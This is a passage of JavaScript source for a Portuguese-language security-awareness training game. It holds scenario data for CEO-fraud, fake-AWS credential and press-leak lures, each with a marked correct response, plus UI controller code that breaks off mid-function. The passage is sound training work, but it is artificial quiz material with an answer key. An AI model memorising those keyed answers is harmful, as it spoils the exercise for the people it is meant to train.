          { id: 'a2', label: '📦 Enviar Arquivo private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'A gangue interceptou todo o tráfego HTTPS criptografado da empresa.', explanation: 'Chaves privadas nunca saem do cofre de servidores sob nenhuma hipótese.' }
        ]
      },
      {
        id: 's3-4',
        channel: 'zap',
        time: '16:05',
        senderName: 'alex.intern (Via TechZap)',
        senderEmail: '+55 11 95432-1098',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: '[CHAT TECHZAP] alex.intern: "Dúvida sobre configuração da VPN de dev"',
        snippet: 'Oi, estou com erro 403 no ambiente de staging. Segue meu chamado #STG-331...',
        meta: { 'Contato': 'alex.intern (Estagiário)', 'Localização IP': 'São Paulo, Brasil', 'Data': '16:02', 'Chamado': '#STG-331' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>alex.intern:</strong><br>
              "Oi time de TI, estou tentando rodar os testes do front-end no ambiente de staging e dá erro de certificado. Segue o chamado registrado no portal #STG-331. Podem me orientar?"
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Contato', dest: 'alex.intern (IP local de São Paulo) | Chamado #STG-331', details: '✅ Dúvida legítima de suporte interno sem solicitação de credenciais sensíveis.' },
        actions: [
          { id: 'a1', label: '📨 Responder com Link da Documentação da Intranet', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o certificado de staging corretamente.', explanation: 'Contato legítimo de suporte que não envolveu vazamento ou quebra de regras.' },
          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido de Suporte', consequence: 'Estagiário ficou sem trabalhar por bloqueio incorreto.', explanation: 'Alex fez uma pergunta técnica legítima com chamado registrado.' }
        ]
      },
      {
        id: 's3-5',
        channel: 'zap',
        time: '17:30',
        senderName: 'Diretoria Presidência (Via TechZap)',
        senderEmail: '+1 (555) 019-2831',
        avatarChar: 'D',
        avatarColor: '#424242',
        subject: '[CHAT TECHZAP] "Urgente: Libere o acesso SSH para a nova consultoria"',
        snippet: 'Aqui é o Rogério de outro celular em viagem internacional. Libere o IP 198.51.100.22...',
        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número não cadastrado' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>Desconhecido (Foto do Rogério):</strong><br>
              "Aqui é o Rogério CEO. Estou em Nova York fechando um contrato de aquisição. Preciso que você libere agora o IP 198.51.100.22 no firewall SSH. Não fale com ninguém sobre isso."
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Fraude do CEO no WhatsApp', dest: 'Número VOIP Desconhecido dos EUA | Solicitação de Abertura de Porta SSH', details: '🚨 Spear Phishing no WhatsApp! O CEO Rogério está online no canal criptografado oficial da empresa, não no WhatsApp dos EUA.' },
        actions: [
          { id: 'a1', label: '🚨 Denunciar Número & Bloquear no Gateway', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulação executiva abortada e registrada no relatório.', explanation: 'Excelente! O CEO Rogério usa exclusivamente os canais oficiais internos.' },
          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central através da porta liberada.', explanation: 'Fraude do CEO por número VOIP desconhecido violando as políticas.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 4: Contrainteligência & Envio de Arquivos (TechVault)
  // ----------------------------------------------------
  {
    shiftNumber: 4,
    title: 'Turno 4: Contrainteligência & Envio de Arquivos',
    brandName: 'TechVault',
    brandIcon: '📦',
    url: 'https://vault-dispatch.techcore.internal/ops/#honeytokens',
    rulesSummary: `
      <div class="card-head">📦 REGRAS DO TURNO 4 (TECHVAULT)</div>
      <p><strong>Operação Honeytoken do Rogério:</strong><br>Envie APENAS os arquivos autorizados pelo CEO!</p>
      <p><strong>Destino Oficial:</strong><br><code>@techcore-vault.internal</code></p>
    `,
    guideContent: `
      <div class="instructions-section">
        <h4>1. Arquivos Oficiais Autorizados pelo CEO Rogério</h4>
        <ul>
          <li><code>honeytoken_trap_v4.vault</code> -> Enviar para Armadilha C2.</li>
          <li><code>hotfix_auth_patch.enc</code> -> Enviar para Cluster de Deploy.</li>
          <li><code>ciso_master_report.sig</code> -> Enviar para Diretoria Executiva.</li>
          <li><em class="text-danger">Qualquer outro arquivo (ex: chaves reais de AWS ou senhas de produção) solicitado por terceiros DEVE SER REJEITADO!</em></li>
        </ul>
      </div>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Chegamos ao turno decisivo da nossa campanha, Analista! O <strong>Turno 4</strong> é a nossa contraofensiva.</p>
          <p>Com as evidências que você coletou nos turnos anteriores, vamos armar uma <strong>emboscada digital (Honeytokens)</strong> para capturar os criminosos de vez.</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Ativei o <strong>TechVault (Despachador Seguro de Arquivos)</strong>.</p>
          <p>Eu mandei uma lista de arquivos específicos e criptografados que você deve enviar para os servidores de armadilha e cofres oficiais.</p>
        `
      },
      {
        step: 3,
        text: `
          <p><strong>Atenção máxima:</strong></p>
          <p>• Envie apenas os arquivos que eu solicitei: <code>honeytoken_trap_v4.vault</code>, <code>hotfix_auth_patch.enc</code> e <code>ciso_master_report.sig</code> para o destino <code>@techcore-vault.internal</code>.</p>
          <p>• Rejeite qualquer pedido falso de invasores tentando interceptar as chaves verdadeiras da AWS!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's4-1',
        channel: 'vault',
        time: '09:15',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[ORDEM DIRETA] Despachar Arquivo Honeytoken: honeytoken_trap_v4.vault',
        snippet: 'Despache a armadilha com tokens falsos para o dropzone oficial da perícia...',
        meta: { 'Arquivo': 'honeytoken_trap_v4.vault (Hash: 9a8f...bc)', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÁXIMA (CEO)' },
        body: `<p>Instrução Direta do CEO Rogério:</p><div class="email-quote-box"><p>"Analista, envie agora o arquivo <code>honeytoken_trap_v4.vault</code> para o endereço de armadilha oficial <code>dropzone-trap@techcore-vault.internal</code> para rastrearmos a origem do grupo hacker."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Honeytoken', dest: 'Arquivo: honeytoken_trap_v4.vault -> dropzone-trap@techcore-vault.internal', details: '✅ Arquivo oficial de armadilha solicitado diretamente pelo CEO Rogério para o cofre interno.' },
        actions: [
          { id: 'a1', label: '🚀 Despachar honeytoken_trap_v4.vault para o Cofre Oficial', correct: true, toastMsg: 'Honeytoken despachado com sucesso.', logTitle: 'Armadilha Honeytoken Ativada', consequence: 'O grupo hacker mordeu a isca e seus endereços IP foram triangulados pela polícia.', explanation: 'Ordem oficial do CEO Rogério cumprida com precisão.' },
          { id: 'a2', label: '🚫 Cancelar Envio', correct: false, toastMsg: 'Envio cancelado.', logTitle: 'Operação de Contrainteligência Abortada', consequence: 'A emboscada falhou e a gangue conseguiu escapar sem ser rastreada.', explanation: 'O arquivo foi solicitado expressamente pelo CEO Rogério.' }
        ]
      },
      {
        id: 's4-2',
        channel: 'vault',
        time: '11:40',
        senderName: 'Suporte Falso da AWS',
        senderEmail: 'security-audit@aws-cloud-verify.net',
        avatarChar: 'A',
        avatarColor: '#d93025',
        subject: '[URGENTE/AWS] Envio Obrigatório do Arquivo aws_credentials.json',
        snippet: 'Detectamos inconformidade na sua conta AWS. Envie o arquivo de credenciais para auditoria...',
        meta: { 'Arquivo Solicitado': 'aws_credentials.json (CHAVES REAIS)', 'Destino': 'exfil-bucket@aws-cloud-verify.net', 'Data': '11:38', 'Segurança': 'Domínio Falso!' },
        body: `<p>Notificação Externa Falsa:</p><div class="email-quote-box"><p>"Sua conta AWS sofrerá desligamento em 1 hora a menos que você envie o arquivo <code>aws_credentials.json</code> para o bucket de validação."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Tentativa de Exfiltração', dest: 'Destino: exfil-bucket@aws-cloud-verify.net (NÃO É A AWS!)', details: '🚨 Golpe de interceptação! O atacante está tentando roubar as chaves AWS verdadeiras da TechCore!' },
        actions: [
          { id: 'a1', label: '🚫 Rejeitar Envio, Denunciar e Bloquear Domínio', correct: true, toastMsg: 'Tentativa de roubo bloqueada.', logTitle: 'Interceptação de Chaves AWS Evitada', consequence: 'Chaves mestras da nuvem protegidas contra extração criminosa.', explanation: 'A AWS real nunca pede envio de arquivos de credenciais por e-mail.' },
          { id: 'a2', label: '📦 Enviar aws_credentials.json', correct: false, toastMsg: 'Chaves enviadas.', logTitle: 'Vazamento Total da Infraestrutura AWS', consequence: 'Os invasores assumiram o controle de todos os servidores da nuvem.', explanation: 'Nunca envie credenciais e segredos corporativos para remetentes externos.' }
        ]
      },
      {
        id: 's4-3',
        channel: 'vault',
        time: '14:15',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[DEPLOY EMERGENCIAL] Despacho do Pacote: hotfix_auth_patch.enc',
        snippet: 'Enviar hotfix criptografado de correção de vulnerabilidade para o cluster de deploy...',
        meta: { 'Arquivo': 'hotfix_auth_patch.enc (Assinado)', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '14:12', 'Status': 'GPG Assinado pelo CISO' },
        body: `<p>Instrução de Deploy Seguro:</p><div class="email-quote-box"><p>"Despache o pacote <code>hotfix_auth_patch.enc</code> para o cluster de deploy <code>deploy-cluster@techcore-vault.internal</code> para aplicar o patch que bloqueia o backdoor."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Pacote de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> deploy-cluster@techcore-vault.internal', details: '✅ Patch legítimo de contenção assinado pelo CISO e solicitado pelo Rogério.' },
        actions: [
          { id: 'a1', label: '🚀 Despachar hotfix_auth_patch.enc para Deploy', correct: true, toastMsg: 'Patch despachado e aplicado.', logTitle: 'Patch de Segurança Aplicado em Produção', consequence: 'Vulnerabilidades corrigidas em todos os servidores da TechCore.', explanation: 'Envio do arquivo correto para o destino interno seguro conforme instrução do CEO.' },
          { id: 'a2', label: '🚫 Rejeitar Despacho do Patch', correct: false, toastMsg: 'Patch não enviado.', logTitle: 'Atraso em Correção Crítica', consequence: 'Servidores continuaram vulneráveis por falta de aplicação do hotfix.', explanation: 'O pacote de correção foi requisitado pelo CEO com assinatura válida.' }
        ]
      },
      {
        id: 's4-4',
        channel: 'vault',
        time: '16:00',
        senderName: 'Portal de Jornalismo TechLeaks',
        senderEmail: 'redacao@techleaks-news.com',
        avatarChar: 'T',
        avatarColor: '#9333ea',
        subject: '[IMPRENSA] Solicitação de Cópia do Relatório Forense Interno',
        snippet: 'Recebemos relatos de invasão na TechCore. Envie uma cópia do relatório antes da publicação...',
        meta: { 'Arquivo Solicitado': 'ciso_master_report.sig (CONFIDENCIAL)', 'Destino': 'vazamentos@techleaks-news.com', 'Data': '15:58', 'Status': 'Não Autorizado' },
        body: `<p>Tentativa Externa de Obtenção de Dados:</p><div class="email-quote-box"><p>"Gostaríamos que vocês enviassem o relatório forense antes que nossa equipe publique a matéria sobre a invasão."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Sigilo Corporativo', dest: 'Destino: vazamentos@techleaks-news.com (Externo)', details: '🚨 Relatórios forenses são ultraconfidenciais e de circulação estritamente interna!' },
        actions: [
          { id: 'a1', label: '🛡️ Rejeitar Envio e Encaminhar para Assessoria Jurídica', correct: true, toastMsg: 'Informação sigilosa preservada.', logTitle: 'Vazamento para Imprensa Evitado', consequence: 'Sigilo de mercado preservado de acordo com a política corporativa.', explanation: 'Arquivos forenses e de segurança jamais são compartilhados com entidades externas.' },
          { id: 'a2', label: '📦 Enviar Relatório Forense', correct: false, toastMsg: 'Arquivo enviado.', logTitle: 'Vazamento de Segredo Corporativo', consequence: 'A empresa sofreu queda na bolsa de valores por vazamento indevido.', explanation: 'Violação grave de NDA e política de segurança da informação.' }
        ]
      },
      {
        id: 's4-5',
        channel: 'vault',
        time: '17:45',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[FINAL DE EXPEDIENTE] Envio do Relatório Final: ciso_master_report.sig',
        snippet: 'Encaminhe o pacote final de auditoria para o cofre seguro da Diretoria Executiva...',
        meta: { 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42', 'Prioridade': 'CONCLUSAO DE OPERAÇÃO' },
        body: `<p>Última Ação do Turno 4:</p><div class="email-quote-box"><p>"Analista, despache o relatório <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code> para finalizarmos a auditoria oficial e apresentarmos ao Conselho de Administração!"</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Despacho Final', dest: 'Arquivo: ciso_master_report.sig -> board-vault@techcore-vault.internal', details: '✅ Arquivo final oficial solicitado pelo Rogério para arquivamento no cofre da Diretoria.' },
        actions: [
          { id: 'a1', label: '🚀 Despachar ciso_master_report.sig para a Diretoria', correct: true, toastMsg: 'Relatório final entregue à Diretoria.', logTitle: 'Auditoria Concluída com Sucesso', consequence: 'Relatório master entregue ao conselho e campanha finalizada com louvor!', explanation: 'Perfeita conclusão da campanha dos 4 turnos da TechCore.' },
          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega da Auditoria', consequence: 'A reunião do conselho de administração não recebeu o relatório final.', explanation: 'O relatório final oficial foi solicitado expressamente pelo CEO.' }
        ]
      }
    ]
  }
];

// ==========================================
// MAIN SIMULATOR CONTROLLER (4 SHIFTS)
// ==========================================
class TechMailSimulator {
  constructor() {
    this.currentShiftIndex = 0; // 0 = Turno 1, 1 = Turno 2, 2 = Turno 3, 3 = Turno 4
    this.currentDialogIndex = 0;
    this.processedItems = [];
    this.decisionsHistory = [];
    this.campaignHistory = []; // Cumulative history across all shifts
    this.currentCategoryFilter = 'all';

    this.cacheDOMElements();
    this.bindEvents();
  }

  cacheDOMElements() {
    this.startScreen = document.getElementById('start-screen');
    this.exitScreen = document.getElementById('exit-screen');
    this.ceoDialogModal = document.getElementById('ceo-dialog-modal');
    this.mainWorkspace = document.getElementById('main-workspace');

    this.btnStartShift = document.getElementById('btn-start-shift');
    this.btnExitSite = document.getElementById('btn-exit-site');
    this.btnReopenSite = document.getElementById('btn-reopen-site');

    // Dialogue elements
    this.ceoDialogTitlebar = document.getElementById('ceo-dialog-titlebar');
    this.ceoDialogSpeakerTag = document.getElementById('ceo-dialog-speaker-tag');
    this.ceoSpeechText = document.getElementById('ceo-speech-text');
    this.dialogStepIndicator = document.getElementById('dialog-step-indicator');
    this.btnDialogPrev = document.getElementById('btn-dialog-prev');
    this.btnDialogNext = document.getElementById('btn-dialog-next');
    this.btnStartWorkstationFromDialog = document.getElementById('btn-start-workstation-from-dialog');
    this.btnSkipDialog = document.getElementById('btn-skip-dialog');

    // Workspace headers & apps
    this.shiftPillBadge = document.getElementById('shift-pill-badge');
    this.browserTabIcon = document.getElementById('browser-tab-icon');
    this.browserTabTitle = document.getElementById('browser-tab-title');
    this.browserUrlBar = document.getElementById('browser-url-bar');
    this.appBrandIcon = document.getElementById('app-brand-icon');
    this.appBrandName = document.getElementById('app-brand-name');
    this.appSearchInput = document.getElementById('app-search-input');
    this.shiftClock = document.getElementById('shift-clock');
    this.taskbarClock = document.getElementById('taskbar-clock');
    this.taskbarActiveTitle = document.getElementById('taskbar-active-title');

    // Sidebar & Guide
    this.sidebarRulesCard = document.getElementById('sidebar-rules-card');
    this.guideModalBody = document.getElementById('guide-modal-body');
    this.btnTopGuide = document.getElementById('btn-top-guide');
    this.btnCloseGuide = document.getElementById('btn-close-guide');
    this.btnCloseGuideFoot = document.getElementById('btn-close-guide-foot');
    this.guideModal = document.getElementById('guide-modal');
    this.btnSoundToggle = document.getElementById('btn-sound-toggle');
    this.btnWinExit = document.getElementById('btn-win-exit');

    // Desktop icons
    this.diconMail = document.getElementById('dicon-mail');
    this.diconGithub = document.getElementById('dicon-github');
    this.diconIam = document.getElementById('dicon-iam');
    this.diconDb = document.getElementById('dicon-db');
    this.diconZap = document.getElementById('dicon-zap');
    this.diconVault = document.getElementById('dicon-vault');
    this.diconGuide = document.getElementById('dicon-guide');

    // Sidebar folder rows
    this.folderDbRow = document.getElementById('folder-db-row');
    this.folderZapRow = document.getElementById('folder-zap-row');
    this.folderVaultRow = document.getElementById('folder-vault-row');

    // Views
    this.inboxListView = document.getElementById('inbox-list-view');
    this.emailItemsContainer = document.getElementById('email-items-container');
    this.emailReaderView = document.getElementById('email-reader-view');
    this.auditReportView = document.getElementById('audit-report-view');
    this.btnBackToInbox = document.getElementById('btn-back-to-inbox');
    this.browserBackBtn = document.getElementById('browser-back-btn');
    this.browserRefreshBtn = document.getElementById('browser-refresh-btn');

    // Badges
    this.badgeEmailCount = document.getElementById('badge-email-count');
    this.badgeGithubCount = document.getElementById('badge-github-count');
    this.badgeIamCount = document.getElementById('badge-iam-count');
    this.badgeDbCount = document.getElementById('badge-db-count');
    this.badgeZapCount = document.getElementById('badge-zap-count');
    this.badgeVaultCount = document.getElementById('badge-vault-count');
    this.badgeDoneCount = document.getElementById('badge-done-count');
    this.tabEmailTag = document.getElementById('tab-email-tag');
    this.tabGithubTag = document.getElementById('tab-github-tag');
    this.tabIamTag = document.getElementById('tab-iam-tag');

    // Reader elements
    this.readerTypeTag = document.getElementById('reader-type-tag');
    this.readerTimeMeta = document.getElementById('reader-time-meta');
    this.readerSubjectTitle = document.getElementById('reader-subject-title');
    this.readerSenderAvatar = document.getElementById('reader-sender-avatar');
    this.readerSenderName = document.getElementById('reader-sender-name');
    this.readerSenderEmail = document.getElementById('reader-sender-email');
    this.readerReceivedTime = document.getElementById('reader-received-time');
    this.btnToggleHeaders = document.getElementById('btn-toggle-headers');
    this.technicalHeadersBox = document.getElementById('technical-headers-box');
    this.headerDe = document.getElementById('header-de');
    this.headerPara = document.getElementById('header-para');
    this.headerData = document.getElementById('header-data');
    this.headerAuth = document.getElementById('header-auth');
    this.readerBodyMessage = document.getElementById('reader-body-message');
    this.readerInspectorSection = document.getElementById('reader-inspector-section');
    this.decisionButtonsGroup = document.getElementById('decision-buttons-group');

    // Toast
    this.actionToast = document.getElementById('action-toast');
    this.toastMsg = document.getElementById('toast-msg');

    // Audit Report Elements
    this.reportThreatsAvoided = document.getElementById('report-threats-avoided');
    this.reportThreatsTaken = document.getElementById('report-threats-taken');
    this.reportHealthFinal = document.getElementById('report-health-final');
    this.reportReputationFinal = document.getElementById('report-reputation-final');
    this.auditStamp = document.getElementById('audit-stamp');
    this.auditTitle = document.getElementById('audit-title');
    this.auditSubText = document.getElementById('audit-sub-text');
    this.auditVerdictTitle = document.getElementById('audit-verdict-title');
    this.auditVerdictText = document.getElementById('audit-verdict-text');
    this.auditTableBody = document.getElementById('audit-table-body');
    this.btnNextShiftAction = document.getElementById('btn-next-shift-action');
    this.btnRestartShift = document.getElementById('btn-restart-shift');
  }

  getCurrentShift() {
    return CAMPAIGN_SHIFTS[this.currentShiftIndex] || CAMPAIGN_SHIFTS[0];
  }

  bindEvents() {
    // 1. Start Shift from Title Screen -> Opens Dialogue for Turno 1
    this.btnStartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.openCeoDialogueForShift(0);
    });
    this.btnStartShift.addEventListener('mouseenter', () => audio.menuHover());

    // 2. Exit screen
    this.btnExitSite.addEventListener('click', () => {
      audio.click();
      this.startScreen.style.display = 'none';
      this.exitScreen.style.display = 'flex';
    });
    this.btnExitSite.addEventListener('mouseenter', () => audio.menuHover());

    // Window exit X button in titlebar
    this.btnWinExit.addEventListener('click', () => {
      audio.click();
      this.mainWorkspace.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    this.btnReopenSite.addEventListener('click', () => {
      audio.click();
      this.exitScreen.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    // 3. Dialogue navigation
    this.btnDialogNext.addEventListener('click', () => {
      audio.speechAdvance();
      const shift = this.getCurrentShift();
      if (this.currentDialogIndex < shift.ceoDialogues.length - 1) {
        this.currentDialogIndex++;
        this.renderDialogueStep();
      }
    });

    this.btnDialogPrev.addEventListener('click', () => {
      audio.speechAdvance();
      if (this.currentDialogIndex > 0) {
        this.currentDialogIndex--;
        this.renderDialogueStep();
      }
    });

    this.btnStartWorkstationFromDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSkipDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    // 4. Sound & Guide Modals
    this.btnSoundToggle.addEventListener('click', () => {
      audio.enabled = !audio.enabled;
      this.btnSoundToggle.textContent = audio.enabled ? '🔊' : '🔇';
      if (audio.enabled) audio.click();
    });

    const openGuideFn = () => {
      audio.click();
      this.updateGuideModalContent();
      this.guideModal.style.display = 'flex';
    };
    this.btnTopGuide.addEventListener('click', openGuideFn);
    this.diconGuide.addEventListener('click', openGuideFn);

    const closeGuideFn = () => {
      audio.click();
      this.guideModal.style.display = 'none';
    };
    this.btnCloseGuide.addEventListener('click', closeGuideFn);
    this.btnCloseGuideFoot.addEventListener('click', closeGuideFn);

    // Desktop icons filtering
    this.diconMail.addEventListener('click', () => { audio.click(); this.setCategoryView('email'); });
    this.diconGithub.addEventListener('click', () => { audio.click(); this.setCategoryView('github'); });
    this.diconIam.addEventListener('click', () => { audio.click(); this.setCategoryView('iam'); });
    this.diconDb.addEventListener('click', () => { audio.click(); this.setCategoryView('db'); });
    this.diconZap.addEventListener('click', () => { audio.click(); this.setCategoryView('zap'); });
    this.diconVault.addEventListener('click', () => { audio.click(); this.setCategoryView('vault'); });

    // Reader buttons
    this.btnBackToInbox.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserBackBtn.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserRefreshBtn.addEventListener('click', () => {
      audio.click();
      this.renderInboxRows();
      this.showToast('Fila sincronizada com sucesso.');
    });

    this.btnToggleHeaders.addEventListener('click', () => {
      audio.click();
      const isHidden = this.technicalHeadersBox.style.display === 'none';
      this.technicalHeadersBox.style.display = isHidden ? 'flex' : 'none';
      this.btnToggleHeaders.textContent = isHidden ? 'Ocultar Detalhes ▴' : 'Detalhes de Segurança ▾';
    });

    // Category Tabs
    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(tab => {
      tab.addEventListener('click', (e) => {
        audio.click();
        const cat = e.currentTarget.getAttribute('data-cat');
        this.setCategoryView(cat);
      });
    });

    // Sidebar navigation
    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(item => {
      item.addEventListener('click', (e) => {
        audio.click();
        const view = e.currentTarget.getAttribute('data-view');
        this.setCategoryView(view);
      });
    });

    // Next Shift Action in Final Audit Report
    this.btnNextShiftAction.addEventListener('click', () => {
      audio.click();
      if (this.currentShiftIndex < CAMPAIGN_SHIFTS.length - 1) {
        this.currentShiftIndex++;
        this.auditReportView.style.display = 'none';
        this.openCeoDialogueForShift(this.currentShiftIndex);
      } else {
        // Campaign Complete - restart
        this.currentShiftIndex = 0;
        this.campaignHistory = [];
        this.auditReportView.style.display = 'none';
        this.startScreen.style.display = 'flex';
      }
    });

    this.btnRestartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.auditReportView.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });
  }

  openCeoDialogueForShift(shiftIndex) {
    this.currentShiftIndex = shiftIndex;
    this.currentDialogIndex = 0;
    const shift = this.getCurrentShift();

    this.ceoDialogTitlebar.textContent = `📡 CANAL_DIRETORIA // BRIEFING_TURNO_${shift.shiftNumber}_ROGERIO_CEO`;
    this.ceoDialogSpeakerTag.textContent = `📟 COMUNICADO DO CEO ROGÉRIO (TURNO ${shift.shiftNumber}/${CAMPAIGN_SHIFTS.length}):`;
    
    this.renderDialogueStep();
    this.ceoDialogModal.style.display = 'flex';
  }

  renderDialogueStep() {
    const shift = this.getCurrentShift();
    const dialog = shift.ceoDialogues[this.currentDialogIndex];
    this.ceoSpeechText.innerHTML = dialog.text;
    this.dialogStepIndicator.textContent = `Mensagem ${dialog.step} de ${shift.ceoDialogues.length}`;

    this.btnDialogPrev.style.display = this.currentDialogIndex > 0 ? 'inline-flex' : 'none';
    
    if (this.currentDialogIndex === shift.ceoDialogues.length - 1) {
      this.btnDialogNext.style.display = 'none';
      this.btnStartWorkstationFromDialog.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.textContent = `🚀 Iniciar Turno ${shift.shiftNumber} (09:00)`;
    } else {
      this.btnDialogNext.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.style.display = 'none';
    }
  }

  startShiftExecution() {
    const shift = this.getCurrentShift();
    this.startScreen.style.display = 'none';
    this.mainWorkspace.style.display = 'flex';
    this.processedItems = [];
    this.decisionsHistory = [];
    this.currentCategoryFilter = 'all';

    // Update UI for the current shift
    this.shiftPillBadge.textContent = `TURNO ${shift.shiftNumber}/4`;
    this.browserTabIcon.textContent = shift.brandIcon;
    this.browserTabTitle.textContent = `${shift.brandName} - Turno ${shift.shiftNumber} (${shift.scenarios.length} tarefas)`;
    this.browserUrlBar.value = shift.url;
    this.appBrandIcon.textContent = shift.brandIcon;
    this.appBrandName.textContent = shift.brandName;
    this.taskbarActiveTitle.textContent = `${shift.brandIcon} ${shift.brandName} - Turno ${shift.shiftNumber}`;
    this.sidebarRulesCard.innerHTML = shift.rulesSummary;

    // Show/hide apps in sidebar according to shift
    this.folderDbRow.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';
    this.folderZapRow.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';
    this.folderVaultRow.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';

    this.updateBadges();
    this.showInboxList();
    this.renderInboxRows();
  }

  updateGuideModalContent() {
    const shift = this.getCurrentShift();
    this.guideModalBody.innerHTML = shift.guideContent;
  }

  setCategoryView(view) {
    this.currentCategoryFilter = view;

    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(i => {
      i.classList.toggle('active', i.getAttribute('data-view') === view);
    });

    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(t => {
      t.classList.toggle('active', t.getAttribute('data-cat') === view);
    });

    this.showInboxList();
    this.renderInboxRows();
  }

  showInboxList() {
    this.emailReaderView.style.display = 'none';
    this.auditReportView.style.display = 'none';
    this.inboxListView.style.display = 'flex';
    this.renderInboxRows();
  }

  updateBadges() {
    const shift = this.getCurrentShift();
    const unread = shift.scenarios.filter((_, idx) => !this.processedItems.includes(idx));
    
    const unreadEmail = unread.filter(s => s.channel === 'email').length;
    const unreadGithub = unread.filter(s => s.channel === 'github').length;
    const unreadIam = unread.filter(s => s.channel === 'iam').length;
    const unreadDb = unread.filter(s => s.channel === 'db').length;
    const unreadZap = unread.filter(s => s.channel === 'zap').length;
    const unreadVault = unread.filter(s => s.channel === 'vault').length;

    this.badgeEmailCount.textContent = unreadEmail;
    this.badgeGithubCount.textContent = unreadGithub;
    this.badgeIamCount.textContent = unreadIam;
    this.badgeDbCount.textContent = unreadDb;
    this.badgeZapCount.textContent = unreadZap;
    this.badgeVaultCount.textContent = unreadVault;
    this.badgeDoneCount.textContent = this.processedItems.length;

    this.tabEmailTag.textContent = `${unreadEmail} novos`;
    this.tabGithubTag.textContent = `${unreadGithub} novos`;
    this.tabIamTag.textContent = `${unreadIam} novos`;
    
    const activeItem = shift.scenarios[this.processedItems.length] || shift.scenarios[shift.scenarios.length - 1];
    const timeStr = this.processedItems.length >= shift.scenarios.length ? '18:00' : activeItem.time;
    this.shiftClock.textContent = timeStr;
    this.taskbarClock.textContent = timeStr;
  }

  renderInboxRows() {
    this.emailItemsContainer.innerHTML = '';
    const shift = this.getCurrentShift();

    shift.scenarios.forEach((item, index) => {
      const isProcessed = this.processedItems.includes(index);

      if (this.currentCategoryFilter === 'processed') {
        if (!isProcessed) return;
      } else if (this.currentCategoryFilter !== 'all' && item.channel !== this.currentCategoryFilter) {
        return;
      }

      const row = document.createElement('div');
      row.className = `email-row-item ${!isProcessed ? 'unread' : 'processed'}`;
      
      let tagLabel = 'TechMail';
      let tagClass = 'tag-email';
      if (item.channel === 'github') { tagLabel = 'GitHub PR'; tagClass = 'tag-github'; }
      if (item.channel === 'iam') { tagLabel = 'IAM Access'; tagClass = 'tag-iam'; }
      if (item.channel === 'db') { tagLabel = 'TechDB SQL'; tagClass = 'tag-db'; }
      if (item.channel === 'zap') { tagLabel = 'TechZap Chat'; tagClass = 'tag-zap'; }
      if (item.channel === 'vault') { tagLabel = 'TechVault'; tagClass = 'tag-vault'; }

      row.innerHTML = `
        <div class="row-controls">
          <input type="checkbox" ${isProcessed ? 'checked' : ''} onclick="event.stopPropagation()">
          <span class="row-star" onclick="event.stopPropagation(); this.classList.toggle('starred')">★</span>
        </div>
        <span class="row-tag ${tagClass}">${tagLabel}</span>
